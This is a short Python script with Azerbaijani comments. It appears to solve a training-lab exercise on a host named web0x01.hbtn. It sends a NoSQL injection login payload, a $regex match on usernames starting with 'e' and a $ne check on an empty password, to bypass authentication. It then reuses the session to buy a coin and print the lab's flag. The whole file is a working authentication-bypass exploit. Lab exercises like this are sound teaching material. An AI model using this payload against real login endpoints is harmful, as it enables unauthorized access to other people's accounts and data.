import requests

# 1. Tənzimləmələr
login_url = "http://web0x01.hbtn/api/a3/nosql_injection/sign_in"
buy_url = "http://web0x01.hbtn/api/a3/nosql_injection/crypto"

# Sessiya yaradırıq (ki, login olandan sonra sistem bizi yadda saxlasın)
session = requests.Session()

# 2. HÜCUM: "e" ilə başlayan istifadəçi kimi daxil oluruq
# Dostunun dediyi yer: username -> regex ^e (e ilə başlayan), password -> boş deyil
login_payload = {
    "username": {"$regex": "^e"},
    "password": {"$ne": ""}
}

print("🚀 'e' hərfi ilə başlayan istifadəçi axtarılır və giriş edilir...")
r_login = session.post(login_url, json=login_payload)

if "session" in r_login.text or "id" in r_login.text:
    print("✅ Giriş uğurlu oldu!")
    print(f"📄 Cavab: {r_login.text}")
else:
    print("❌ Giriş alınmadı. Cavaba bax:", r_login.text)
    exit()

# 3. ALIŞ-VERİŞ: 1 HBTNc alırıq ki, Flag çıxsın
buy_payload = {
    "coin": "HBTNc",
    "amount": 1
}

print("\n💸 Coin alınır...")
r_buy = session.post(buy_url, json=buy_payload)

# 4. NƏTİCƏ
print("\n🚩 SƏNİN FLAG-İN:")
print(r_buy.text)
